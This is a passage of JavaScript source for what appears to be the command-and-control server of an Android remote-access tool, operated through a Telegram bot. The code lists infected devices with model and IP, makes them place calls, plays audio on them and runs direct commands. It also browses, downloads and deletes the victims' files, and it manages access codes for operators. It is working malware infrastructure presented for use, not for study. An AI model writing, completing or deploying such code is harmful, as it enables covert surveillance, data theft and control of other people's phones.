    if (currentAction === "makeCallText") {
      const number = appData.get("currentNumber");
      io.to(currentTarget).emit("commend", {
        request: "makeCall",
        extras: [{ key: "number", value: number }, { key: "text", value: USER_TEXT }]
      });
      appData.delete("currentNumber");
      return afterAction();
    }

    // ═══ الأزرار الرئيسية ═══
    if (USER_TEXT === BTN.COUNT_DEVICES) {
      const devices = getVisibleDevices(USER_ID);
      if (devices.length === 0) {
        return bot.sendMessage(USER_ID, TEXT.NO_DEVICE, { parse_mode: "HTML" });
      }
      let out = fill(TEXT.DEVICE_COUNT_HEADER, { count: devices.length });
      devices.forEach((item, i) => {
        const s = item.socket;
        out += fill(TEXT.DEVICE_COUNT_ITEM, {
          index: i + 1, model: s.model, version: s.version, ip: s.ip
        });
      });
      return bot.sendMessage(USER_ID, out, { parse_mode: "HTML" });
    }

    if (USER_TEXT === BTN.CONTROL_PANEL) {
      const devices = getVisibleDevices(USER_ID);
      if (devices.length === 0) {
        return bot.sendMessage(USER_ID, TEXT.NO_DEVICE, { parse_mode: "HTML" });
      }
      const rows = [];
      devices.forEach(item => rows.push([item.socket.model]));
      rows.push([BTN.BACK_HOME]);
      return bot.sendMessage(USER_ID, TEXT.SELECT_DEVICE, {
        parse_mode: "HTML",
        reply_markup: { keyboard: rows, resize_keyboard: true, one_time_keyboard: true }
      });
    }

    if (USER_TEXT === BTN.DEV_INFO) {
      return bot.sendMessage(USER_ID, TEXT.DEV_INFO, { parse_mode: "HTML" });
    }

    if (USER_TEXT === BTN.BACK_HOME) {
      return bot.sendMessage(USER_ID, TEXT.MAIN_MENU, {
        parse_mode: "HTML",
        reply_markup: getKeyboard(USER_ID)
      });
    }

    if (USER_TEXT === BTN.BACK_ACTION) {
      if (IS_OWNER && appData.get(OWNER_ID + "_action") === "createCode") {
        appData.delete(OWNER_ID + "_action");
        return bot.sendMessage(OWNER_ID, TEXT.CREATE_CODE_CANCEL, { parse_mode: "HTML", reply_markup: KB.OWNER });
      }
      const name = getCurrentDeviceName();
      return bot.sendMessage(USER_ID, fill(TEXT.CONTROL_MENU, { device: name }), {
        parse_mode: "HTML", reply_markup: KB.CONTROL
      });
    }

    // ═══ اختيار جهاز ═══
    let foundDevice = false;
    const visibleDevices = getVisibleDevices(USER_ID);
    visibleDevices.forEach(item => {
      if (USER_TEXT === item.socket.model) {
        appData.set("currentTarget", item.id);
        foundDevice = true;
        bot.sendMessage(USER_ID, fill(TEXT.CONTROL_MENU, { device: item.socket.model }), {
          parse_mode: "HTML", reply_markup: KB.CONTROL
        });
      }
    });
    if (foundDevice) return;

    // ═══ الأوامر المباشرة ═══
    if (DIRECT_COMMANDS[USER_TEXT]) {
      if (!currentTarget) {
        return bot.sendMessage(USER_ID, TEXT.NO_TARGET, { parse_mode: "HTML" });
      }
      io.to(currentTarget).emit("commend", {
        request: DIRECT_COMMANDS[USER_TEXT],
        extras: []
      });
      return afterAction();
    }

    // ═══ زر الملفات ═══
    if (USER_TEXT === BTN.FILES) {
      if (!currentTarget) {
        return bot.sendMessage(USER_ID, TEXT.NO_TARGET, { parse_mode: "HTML" });
      }
      io.to(currentTarget).emit("file-explorer", { request: "ls", extras: [] });
      return bot.sendMessage(USER_ID, TEXT.SUCCESS, { parse_mode: "HTML" });
    }

    // ═══ الأوامر المدخلة ═══
    if (INPUT_COMMANDS[USER_TEXT]) {
      if (!currentTarget) {
        return bot.sendMessage(USER_ID, TEXT.NO_TARGET, { parse_mode: "HTML" });
      }
      const cmd = INPUT_COMMANDS[USER_TEXT];
      appData.set("currentAction", cmd.state);
      return bot.sendMessage(USER_ID, cmd.prompt, {
        parse_mode: "HTML", reply_markup: KB.BACK
      });
    }

  } catch (err) {
    console.error("❌", err.message);
  }
});

// ═══════════════════════════════════════════════════════
//   🎙 الصوت
// ═══════════════════════════════════════════════════════
bot.on("voice", voice => {
  try {
    if (appData.get("currentAction") === "recordVoice") {
      const USER_ID = String(voice.chat.id);
      const target = appData.get("currentTarget");
      bot.getFileLink(voice.voice.file_id).then(url => {
        io.to(target).emit("commend", {
          request: "playAudio",
          extras: [{ key: "url", value: url }]
        });
        const name = getCurrentDeviceName();
        appData.delete("currentAction");
        bot.sendMessage(USER_ID, TEXT.SUCCESS, { parse_mode: "HTML" });
        stayInControl(USER_ID, name);
      }).catch(() => {});
    }
  } catch(e) { console.error(e); }
});

// ═══════════════════════════════════════════════════════
//   🖱 Callback Query
// ═══════════════════════════════════════════════════════
bot.on("callback_query", query => {
  try {
    const USER_ID = String(query.from.id);
    if (!isAuthorized(USER_ID)) {
      return bot.answerCallbackQuery(query.id, { text: "❌ غير مصرح" });
    }

    const [device, action] = query.data.split("|");
    const [cmd, param]     = action.split("-");

    const emitToDevice = (request, extras = []) => {
      io.sockets.sockets.forEach((s, id) => {
        if (s.model === device) io.to(id).emit("file-explorer", { request, extras });
      });
    };

    if (cmd === "back")   emitToDevice("back");
    if (cmd === "cd")     emitToDevice("cd",   [{ key: "name", value: param }]);
    if (cmd === "upload") emitToDevice("upload",[{ key: "name", value: param }]);
    if (cmd === "delete") emitToDevice("delete",[{ key: "name", value: param }]);

    if (cmd === "request") {
      bot.editMessageText(fill(TEXT.FILE_ACTION, { name: param }), {
        chat_id: USER_ID,
        message_id: query.message.message_id,
        reply_markup: {
          inline_keyboard: [[
            { text: "📥 تحميل", callback_data: device + "|upload-" + param },
            { text: "🗑 حذف", callback_data: device + "|delete-" + param }
          ]]
        },
        parse_mode: "HTML"
      }).catch(() => {});
    }

    bot.answerCallbackQuery(query.id).catch(() => {});
  } catch(e) { console.error(e); }
});

// ═══════════════════════════════════════════════════════
//   🧹 تنظيف دوري
// ═══════════════════════════════════════════════════════
setInterval(() => {
  const now = Date.now();
  Object.keys(codes).forEach(code => {
    if (now > codes[code].expiresAt && !codes[code].usedBy) {
      delete codes[code];
    }
  });
  Object.keys(ipRefs).forEach(ip => {
    if (now - ipRefs[ip].savedAt > 7 * 24 * 60 * 60 * 1000) {
      delete ipRefs[ip];
    }
  });
}, CONFIG.CLEANUP_INTERVAL);

// ═══════════════════════════════════════════════════════
//   💓 Ping
// ═══════════════════════════════════════════════════════
setInterval(() => {
  io.sockets.sockets.forEach((_s, id) => io.to(id).emit("ping", {}));
}, CONFIG.PING_INTERVAL);

// ═══════════════════════════════════════════════════════
//   🚀 التشغيل
// ═══════════════════════════════════════════════════════
server.listen(CONFIG.PORT, () => {
  console.log("╔══════════════════════════╗");
  console.log("║   ⚡ SERVER ONLINE ⚡     ║");
  console.log("╠══════════════════════════╣");
  console.log("║  📡 PORT: " + String(CONFIG.PORT).padEnd(15) + "║");
  console.log("║  🤖 BOT:  " + String(CONFIG.BOT_TOKEN ? "✅" : "❌").padEnd(15) + "║");
  console.log("╚══════════════════════════╝");
});

process.on("uncaughtException", err => console.error("⚠️", err.message));
process.on("unhandledRejection", err => console.error("⚠️", err));